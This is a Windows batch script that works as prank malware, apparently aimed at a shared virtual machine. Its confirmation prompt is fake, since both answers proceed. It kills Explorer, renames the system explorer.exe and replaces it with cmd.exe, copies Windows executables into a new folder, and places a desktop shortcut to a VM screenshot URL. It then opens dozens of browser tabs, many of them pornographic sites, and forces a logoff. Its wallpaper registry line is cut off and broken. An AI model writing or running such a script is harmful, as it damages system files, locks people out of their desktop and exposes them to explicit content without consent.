@echo off
SET /P AREYOUSURE=Are you sure to proceed (Y/[N])? 
IF /I "%AREYOUSURE%" NEQ "Y" GOTO MAIN
GOTO MAIN
:MAIN
:: Kill Explorer
taskkill /f /im explorer.exe

:: Backup original explorer.exe
cd /d %windir%\System32
ren explorer.exe bak.exe

:: Replace with cmdd.exe (must be in the same folder or full path)
copy cmd.exe explorer.exe

:: Set red wallpaper (creates a red BMP and sets it)
setlocal
set "wallpaperPath=C:\Windows\Web\Wallpaper\Windows\img0.jpg"

:: Set it as wallpaper
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wall_

setlocal

:: Set the shortcut name and target URL
set "shortcutName=vm7_screenshot.url"
set "url=https://cvmapi.elijahr.dev/api/v1/screenshot/vm7"

:: Get the desktop path for the current user
set "desktopPath=%USERPROFILE%\Desktop"

:: Create the .url shortcut file
echo [InternetShortcut] > "%desktopPath%\%shortcutName%"
echo URL=%url% >> "%desktopPath%\%shortcutName%"

cd c:/
md butt
cd c:/butt
copy c:/windows/*.exe c:/butt
Start http://www.pornhub.com/
Start http://www.directv.com/
Start http://www.xbox.com/
Start http://www.google.com/
Start http://www.xvideos.com/
Start http://www.directv.com/
Start http://www.archive.org/
Start http://www.pornhub.com/
Start http://www.pornhub.com/
Start http://www.directv.com/
Start http://www.xbox.com/
Start http://www.google.com/
Start http://www.xvideos.com/
Start http://www.directv.com/
Start http://www.archive.org/
Start http://www.pornhub.com/
Start http://www.pornhub.com/
Start http://www.directv.com/
Start http://www.xbox.com/
Start http://www.google.com/
Start http://www.xvideos.com/
Start http://www.directv.com/
Start http://www.archive.org/
Start http://www.pornhub.com/
Start http://www.pornhub.com/
Start http://www.directv.com/
Start http://www.xbox.com/
Start http://www.google.com/
Start http://www.xvideos.com/
Start http://www.directv.com/
Start http://www.archive.org/
Start http://www.pornhub.com/
Start http://www.pornhub.com/
Start http://www.directv.com/
Start http://www.xbox.com/
Start http://www.google.com/
Start http://www.xvideos.com/
Start http://www.directv.com/
Start http://www.archive.org/
Start http://www.pornhub.com/
Start http://www.pornhub.com/
Start http://www.directv.com/
Start http://www.xbox.com/
Start http://www.google.com/
Start http://www.xvideos.com/
Start http://www.directv.com/
Start http://www.archive.org/
Start http://www.pornhub.com/
Start http://www.pornhub.com/
Start http://www.directv.com/
Start http://www.xbox.com/
Start http://www.google.com/
Start http://www.xvideos.com/
Start http://www.directv.com/
Start http://www.archive.org/
Start http://www.pornhub.com/
shutdown -l
exit
